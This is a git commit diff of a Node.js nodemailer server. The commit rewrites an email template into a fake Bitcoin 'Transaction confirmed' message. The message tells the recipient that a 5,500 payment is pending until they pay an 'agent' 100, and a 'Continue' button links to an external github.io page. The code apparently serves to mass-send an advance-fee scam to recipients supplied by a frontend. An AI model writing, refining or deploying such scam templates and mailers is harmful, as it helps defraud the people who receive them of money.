73d91bb3cd5296935fe16ba6aeda73c308c61194
Moneyboy.buy <michyqruz@gmail.com>
2025-08-23 09:53:26 +0100

    Update server.js

--- server.js
+++ server.js
@@ -43,13 +43,13 @@ const transporter = nodemailer.createTransport({
   const mailOptions = {
     from: `"Testmail" <${process.env.EMAIL_USER}>`,
     to: to, // Recipient email from frontend
-    subject: 'Transaction confirmed (Ref ID - TY-U-753194873157)',
+    subject: 'Transaction confirmed (Ref ID - TY-U-753194873159)',
     text: `Hello ${sanitizedName}!\n\nThank you for subscribing! This email contains updates and images in HTML format, but your email client is displaying the plain-text version. Visit our website for more information: https://x.com`,
     html: `
   <div style="text-align: center; background-color: #f1f7f7; max-width: 500px; margin: 0 auto; padding: 20px;">
           <img src="https://cdn.pixabay.com/photo/2021/04/30/16/47/btc-logo-6219386_1280.png" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
-          <h1 style="font-size: 32px;">Big text</h1>
-          <p>Hello there, ${sanitizedName}!</p>
+          <h1 style="font-size: 32px;">Payment to ${sanitizedName}</h1>
+          <p>PENDING<br>We adding an 100 to your payment, agent is going to request 100 from you, as soon as you pay it, you receive the 5,500 and avoid further pending transactions.</p>
           <a href="https://millxore.github.io/seen/" style="display: inline-block; color: #ffffff; padding: 15px 40px; background-color: #f7b611; color: white; text-decoration: none; border-radius: 20px; font-size: 16px; margin: 10px 0; font-weight: bold;">Continue</a>
       </div>
       <div style="background-color: #f1f7f7; max-width: 500px; padding: 20px;">
